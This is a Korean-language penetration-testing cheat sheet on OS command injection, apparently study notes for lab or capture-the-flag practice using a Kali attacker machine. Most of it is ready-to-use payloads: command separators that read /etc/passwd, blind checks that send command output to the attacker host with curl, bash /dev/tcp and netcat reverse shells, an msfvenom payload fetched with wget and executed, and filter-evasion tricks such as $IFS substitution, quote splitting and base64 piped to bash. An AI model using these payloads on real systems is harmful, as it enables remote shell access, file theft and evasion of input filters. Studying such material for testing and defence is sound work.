# 07_커맨드_인젝션

웹 애플리케이션이 사용자 입력값을 OS 명령어로 실행할 때 발생한다. 빈도가 높고 일반적으로 리버스 셸을 바로 획득 가능한 가장 직접적인 취약점이다.

---

## 대표적인 상황

```
수행하는 OS 명령어 실행 (ping, nslookup, ls 등)
이메일 전송 기능
뉴스/기상 확인 (curl 명령어 실행)
파일 처리 (파일명을 파라미터로 받는 기능)
```

---

## 테스트 페이로드

```bash
# 기본 연산자
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 || id
127.0.0.1 `id`
127.0.0.1 $(id)

# 세미콜론(;) — 앞 명령어 성공 여부 무관하게 실행
127.0.0.1; whoami
127.0.0.1; id; pwd; ls

# &&  — 앞 명령어 성공 시만 실행
127.0.0.1 && cat /etc/passwd

# |   — 앞 명령어 출력을 다음으로 파이프
127.0.0.1 | ls -la

# ||  — 앞 명령어 실패 시만 실행
invalid || id

# Backtick / $() — 명령 치환
127.0.0.1 `id`
127.0.0.1 $(id)

# 새줄
127.0.0.1%0Aid
127.0.0.1%0a id
```

## Blind 커맨드 인젝션 확인

출력이 없어도 시간 지연이나 네트워크 요청으로 실행 여부를 확인한다.

```bash
# 시간 지연 기반 확인 (sleep 명령어)
# 응답이 5초 지연되면 커맨드 인젝션 성공
127.0.0.1; sleep 5
127.0.0.1 && sleep 5

# 네트워크 기반 확인 (칼리에서 수신)
# 칼리에서: sudo tcpdump -i eth0 icmp
# 또는: sudo responder -I eth0 -v
127.0.0.1; ping -c 1 <칼리IP>

# DNS 요청 기반 (out-of-band)
# 칼리에서: sudo tcpdump -i eth0 udp port 53
127.0.0.1; nslookup <칼리IP>
127.0.0.1; curl http://<칼리IP>/$(id)
```

## 리버스 셸 획득

```bash
# 칼리에서 리스너 열기
nc -lvnp 4444

# 인젝션 페이로드
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<칼리IP>/4444 0>&1'
127.0.0.1; bash -i >& /dev/tcp/<칼리IP>/4444 0>&1
127.0.0.1; nc -e /bin/bash <칼리IP> 4444
127.0.0.1; /bin/bash -c 'nc -e /bin/bash <칼리IP> 4444'

# URL 인코딩 필요
# &  → %26
# >  → %3E
# space → %20 또는 +
# ;  → %3B

# msfvenom 페이로드 (안정적)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f elf -o shell
# 파일 업로드 뒤: wget http://<칼리IP>/shell -O /tmp/shell; chmod +x /tmp/shell; /tmp/shell
```

## 필터 우회

```bash
# 공백 필터 우회 (코드가 일부 스페이스 차단)
127.0.0.1;cat%09/etc/passwd          # %09 = tab
127.0.0.1;cat$IFS/etc/passwd         # $IFS = space/tab 변수
127.0.0.1;{cat,/etc/passwd}          # 중괄호 방식
127.0.0.1;c$()at /etc/passwd         # 빈 명령 치환

# 키워드 필터 우회
w'h'oami                             # 작은따옴표 삽입
/usr/bin/id
w"h"oami

# 대소문자 혼합
[wW][hH][oO][aA][mM][iI]
```

## 팁

```
입력 필드에 ; | && || 코드 시도 → 실행 확인 (id / whoami)
칼리에 ping 요청되면 Blind 커맨드 인젝션 확정 → 리버스 셸 페이로드
페이로드가 URL에 있으면 URL 인코딩 필수
```

## 따옴표 홀짝 원리 (`w'h'oami` 같은 우회가 왜 되고, 왜 가끔 안 되는지)

서버가 내부적으로 입력값을 따옴표로 감싸서 명령어를 조립하는 경우가 많다 (예: `bash -c 'ping -c 1 ' . $ip . '`). 이때 내가 넣는 따옴표는 그 바깥 템플릿의 따옴표와 합쳐져서 최종 명령어가 완성된다. **따옴표는 반드시 짝(짝수)으로 열고 닫혀야 셸이 정상 해석한다** — 홀수 개면 셸 문법 에러가 나서 명령어 전체가 실행 자체를 안 하고 완전히 빈 응답이 나온다 (필터 메시지도 안 뜨는 게 특징).

```bash
w'h'oami     # 따옴표 2개(짝수) → 정상 실행됨, 필터는 "whoami"라는 연속 문자열을 못 봄
w'h'o'a'm'i  # 따옴표 5개(홀수) → 셸 문법 깨짐 → 빈 응답
w'h'o'am'i   # 따옴표 4개(짝수) → 정상 실행됨
```

글자를 전부 다 따옴표로 감쌀 필요 없다. **필터가 보는 원본 문자열에서 명령어 이름이 연속되지 않게만 끊어주면 되고, 그 상태에서 따옴표 총 개수만 짝수로 맞추면 된다.**

## 슬래시(`/`)나 특정 문자 자체가 필터링될 때

경로에 슬래시가 들어가면 무조건 막히는 필터가 있다. 이때는 슬래시 없이 파일에 접근하는 방법을 쓴다.

```bash
cat *flag*         # 슬래시 없이 와일드카드로 현재 디렉터리 기준 파일 탐색
cat ${HOME:0:1}etc${HOME:0:1}passwd   # $HOME의 첫 글자(/)를 이용해 슬래시를 우회 생성
echo ${PATH:0:1}   # 대부분의 환경변수는 /로 시작하므로 슬래시 문자 자체를 뽑아낼 수 있음
```

## `${IFS}` vs `%0a` — 역할이 다르다

```
${IFS}   # 명령어 "안"의 공백(인자 구분)을 대체 — cat${IFS}file.txt = cat file.txt
%0a      # 명령어와 명령어 "사이"를 잇는 구분자 (줄바꿈) — ;나 |가 막혔을 때 대안
```

필터가 스페이스바(코드 32) 문자만 정확히 검사하고 있으면, 줄바꿈(`%0a`, 코드 10)이나 탭(`%09`)은 다른 문자라서 안 걸리는 경우가 흔하다.

## 공백 우회 추가 기법

```bash
cat${IFS}/etc/passwd          # 변수 치환
cat$IFS/etc/passwd            # 중괄호 없이도 동작하는 셸이 있음
cat<${IFS}/etc/passwd
{cat,/etc/passwd}             # 중괄호 확장 — bash가 자동으로 공백을 넣어 인자로 분리
{cat,${IFS}/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X   # 변수에 저장 후 실행
```

## curl 명령줄에서 `${IFS}`가 안 먹힐 때

브라우저(JS)에서 짠 페이로드를 그대로 터미널 curl에 옮기면, **bash가 URL을 만들기도 전에 `${IFS}`를 먼저 변수로 해석해버려서** 애초에 서버로 전달이 안 될 수 있다.

```bash
curl "http://<대상>/ping.php?ip=127.0.0.1%0acat${IFS}file.txt"   # bash가 먼저 해석, 깨짐
curl "http://<대상>/ping.php?ip=127.0.0.1%0acat\${IFS}file.txt"  # \$ 로 이스케이프, 문자 그대로 전달됨
```

브라우저/Burp에서는 이 문제가 없다 (bash 셸을 거치지 않으니까). curl로 재현할 때만 신경 쓰면 된다.

## 명령어 이름 자체가 블랙리스트에 있을 때 (대소문자/문자 대체)

```bash
[wW][hH][oO][aA][mM][iI]         # 대소문자 조합 (bash extglob 필요할 수 있음)
w"h"oami                          # 큰따옴표로도 동일한 효과
\w\h\o\a\m\i                      # 백슬래시 이스케이프 (셸이 무시하고 원래 글자로 처리)
$(rev<<<'imaohw')                 # 문자열 뒤집어서 저장 후 rev로 복원, 필터가 원본 단어를 못 찾음
COMMAND=whoami; $COMMAND          # 변수에 담아서 실행
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash   # base64로 인코딩해서 명령어 자체를 숨김
```

## 필터 진단 순서 (막혔을 때)

1. 구분자(`;`, `|`, `&`)부터 확인 — 안 되면 `%0a`로 대체
2. 공백 확인 — `cmd arg`가 안 되면 `${IFS}`로 대체
3. 명령어 이름 확인 — `id`가 걸리면 따옴표로 쪼개기 (짝수 유지)
4. 슬래시 확인 — 경로가 걸리면 와일드카드나 환경변수로 우회
5. 한 번에 여러 기법을 다 쌓지 말고, 한 가지씩 바꿔가며 정확히 뭐가 걸렸는지 좁혀나가는 게 빠르다
